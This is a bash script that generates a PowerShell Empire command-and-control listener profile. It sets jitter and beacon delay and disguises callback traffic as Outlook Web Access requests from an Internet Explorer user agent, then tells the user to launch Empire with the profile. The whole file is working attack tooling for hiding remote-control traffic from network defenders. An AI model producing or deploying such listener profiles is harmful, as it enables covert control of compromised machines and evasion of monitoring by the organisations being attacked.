#!/bin/bash
echo "Type the IP for the Empire host>  "
read HOST
echo
read -p " *** I will remove any previous file named microsoft.profile. Press any key to continue or CTRL+C to quit. ***"
echo
echo "OK, creating the file in the current directory."
echo "listeners" > microsoft.profile
echo "uselistener http" >> microsoft.profile
echo "set Name microsoft" >> microsoft.profile
echo "set DefaultJitter 0.6" >> microsoft.profile
echo "set DefaultDelay 11" >> microsoft.profile
echo "set DefaultProfile /owa/mail/inbox.srf,/owa/mail/drafts.srf,/owa/mail/archive.srf|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; yie11; rv:11.0) like Gecko|Accept:*/*" >> microsoft.profile
echo "set Host http://$HOST:80" >> microsoft.profile

echo "Checking that the file exists and its contents..."
echo -e "Name of the created file: "
ls microsoft.profile
echo
echo "Printing the contents on the screen"
cat microsoft.profile
echo
read -p "If everythong before is OK, just press any key to finish. If not, fix the script :P"
clear
echo "Do not forget to type ./empire -r microsoft.profile to start your Empire activities."
echo "Exiting now. Bye!"
